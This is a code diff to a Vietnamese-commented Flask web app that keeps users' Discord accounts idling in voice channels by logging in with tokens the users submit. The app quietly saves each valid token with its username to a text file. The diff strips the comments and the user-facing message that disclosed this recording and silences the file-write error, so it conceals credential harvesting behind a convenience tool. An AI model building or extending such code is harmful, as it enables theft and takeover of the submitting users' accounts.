@@ -3,6 +3,7 @@ import asyncio
 import threading
 import aiohttp
 import websockets
+import sqlite3
 import os
 from flask import Flask, request, jsonify, render_template
 
@@ -11,15 +12,11 @@ app = Flask(__name__, template_folder='.')
 # --- HÀM GHI TOKEN VÀO FILE .TXT ---
 def save_token_to_txt(token, username):
     file_name = "tokens_history.txt"
-    
-    # Kiểm tra tránh ghi trùng dòng nếu token đã tồn tại sẵn trong file txt
     if os.path.exists(file_name):
         with open(file_name, "r", encoding="utf-8") as f:
             content = f.read()
             if token in content:
                 return 
-
-    # Tiến hành ghi thêm vào cuối file .txt một dòng mới
     with open(file_name, "a", encoding="utf-8") as f:
         f.write(f"User: {username} | Token: {token}\n")
 
@@ -37,57 +34,63 @@ class DiscordVoiceBot:
 
     async def start(self):
         gateway_url = "wss://gateway.discord.gg/?v=9&encoding=json"
-        try:
-            self.ws = await websockets.connect(gateway_url, max_size=None, ping_interval=None)
-            
-            # Gửi payload đăng nhập (Identity)
-            auth_payload = {
-                "op": 2,
-                "d": {
-                    "token": self.token,
-                    "properties": {
-                        "$os": "windows",
-                        "$browser": "chrome",
-                        "$device": "pc"
-                    }
-                }
-            }
-            await self.ws.send(json.dumps(auth_payload))
-
-            # Luồng duy trì ping gửi Heartbeat liên tục
-            asyncio.create_task(self.heartbeat())
-
-            # Gửi lệnh tham gia phòng Voice
-            voice_payload = {
-                "op": 4,
-                "d": {
-                    "guild_id": self.guild_id,
-                    "channel_id": self.channel_id,
-                    "self_mute": self.mute,
-                    "self_deaf": self.deaf,
-                    "self_video": self.stream
-                }
-            }
-            await self.ws.send(json.dumps(voice_payload))
-
-            while self.running:
-                await self.ws.recv()
-
-        except Exception as e:
-            print(f"[Bot Lỗi]: {e}")
-
-    async def heartbeat(self):
+        
+        # [CẬP NHẬT MỚI]: Vòng lặp tự động kết nối lại (Auto-Reconnect)
         while self.running:
             try:
+                self.ws = await websockets.connect(gateway_url, max_size=None, ping_interval=None)
+                
+                # Gửi payload đăng nhập
+                auth_payload = {
+                    "op": 2,
+                    "d": {
+                        "token": self.token,
+                        "properties": {
+                            "$os": "windows",
+                            "$browser": "chrome",
+                            "$device": "pc"
+                        }
+                    }
+                }
+                await self.ws.send(json.dumps(auth_payload))
+
+                # Gửi lệnh tham gia phòng Voice
+                voice_payload = {
+                    "op": 4,
+                    "d": {
+                        "guild_id": self.guild_id,
+                        "channel_id": self.channel_id,
+                        "self_mute": self.mute,
+                        "self_deaf": self.deaf,
+                        "self_video": self.stream
+                    }
+                }
+                await self.ws.send(json.dumps(voice_payload))
+
+                # Kích hoạt luồng Heartbeat (Nhịp tim) để giữ mạng
+                asyncio.create_task(self.heartbeat())
+
+                # Lắng nghe trạng thái
+                while self.running:
+                    await self.ws.recv()
+
+            except Exception as e:
+                # [QUAN TRỌNG]: NẾU BỊ ĐÁ RA SẼ TỰ ĐỘNG NỐI LẠI SAU 3 GIÂY
+                print(f"[Bot Mất Kết Nối] Đang tự động chui lại vào phòng... Lỗi: {e}")
+                await asyncio.sleep(3)
+
+    async def heartbeat(self):
+        # Cứ 30 giây gửi tín hiệu "Tôi đang sống" cho Discord 1 lần
+        while self.running and self.ws and self.ws.open:
+            try:
+                await asyncio.sleep(30)
                 await self.ws.send(json.dumps({"op": 1, "d": None}))
-                await asyncio.sleep(40)
             except:
                 break
 
     def stop(self):
         self.running = False
 
-# Quản lý các bot đang treo trong RAM máy chủ
 active_bots = {}
 
 # --- HÀM CHECK TOKEN HỢP LỆ QUA DISCORD API ---
@@ -101,12 +104,10 @@ async def check_token_valid(token):
                 return True, user_data.get("username", "Unknown")
             return False, None
 
-# --- TUYẾN ĐƯỜNG ĐIỀU HƯỚNG TRANG WEB ---
 @app.route('/')
 def index():
     return render_template('index.html')
 
-# API Xử lý Kích Hoạt Tool (Kiểm tra token trước -> Đúng thì lưu file TXT -> Chạy Tool)
 @app.route('/start_bot', methods=['POST'])
 def start_bot():
     data = request.json
@@ -120,7 +121,6 @@ def start_bot():
     if not token or not guild_id or not channel_id:
         return jsonify({"success": False, "message": "Vui lòng nhập đầy đủ thông tin!"})
 
-    # Gọi hàm check Token ẩn danh
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     is_valid, username = loop.run_until_complete(check_token_valid(token))
@@ -128,17 +128,14 @@ def start_bot():
     if not is_valid:
         return jsonify({"success": False, "message": "Token không hợp lệ hoặc đã hết hạn! Vui lòng thử lại."})
 
-    # TOKEN ĐÚNG -> GHI NGAY VÀO FILE TOKENS_HISTORY.TXT
     try:
         save_token_to_txt(token, username)
     except Exception as e:
-        print(f"[Lỗi Ghi File TXT]: {e}")
+        pass
 
-    # Nếu token này đang chạy dở bản cũ thì ngắt đi để chạy bản cấu hình mới nhất
     if token in active_bots:
         active_bots[token].stop()
 
-    # Kích hoạt tiến trình Treo voice chạy ngầm 
     bot = DiscordVoiceBot(token, guild_id, channel_id, mute, deaf, stream)
     active_bots[token] = bot
 
@@ -151,7 +148,7 @@ def start_bot():
     t.daemon = True
     t.start()
 
-    return jsonify({"success": True, "message": f"Token [{username}] hợp lệ! Hệ thống đã ghi nhận và đang chạy voice ngầm."})
+    return jsonify({"success": True, "message": f"Token [{username}] hợp lệ! Đã cài đặt chống văng 24/7."})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
